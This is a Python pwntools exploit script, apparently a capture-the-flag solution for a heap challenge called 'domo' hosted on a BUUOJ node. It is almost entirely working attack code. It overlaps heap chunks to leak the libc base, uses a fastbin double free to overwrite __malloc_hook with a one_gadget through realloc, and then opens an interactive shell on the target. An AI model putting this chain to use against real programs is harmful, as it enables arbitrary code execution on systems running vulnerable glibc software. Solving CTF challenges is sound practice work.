from pwn import *

#io=process('./domo')
io=remote('node3.buuoj.cn',26559)
e=ELF('./domo')
libc=ELF('./libc.so.6')


def add(size,data):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)

def free(idx):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('index:')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('> ')
    io.sendline('3')
    io.recvuntil('index:')
    io.sendline(str(idx))



add(0x100,'a')#0
add(0x10,'b')#1
add(0x110,'c'*0xf8+p64(0x21))#2
add(0x60,'d')#3
free(1)
free(0)
add(0x18,'a'*0x10+p64(0x130))#0
free(2)
add(0x100,'a')#1
show(0)

libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b78
print(hex(libc_base))

malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0xf02a4
realloc = libc_base + libc.symbols['__libc_realloc']

add(0x60,'a')#2
free(2)#double free
free(3)
free(0)

add(0x60,p64(malloc_hook-0x23))#0
add(0x60,'a')#2
add(0x60,'a')#3
add(0x60,'a'*(0x13-8)+p64(one_gadget)+p64(realloc+16))

io.sendline('6')
io.interactive()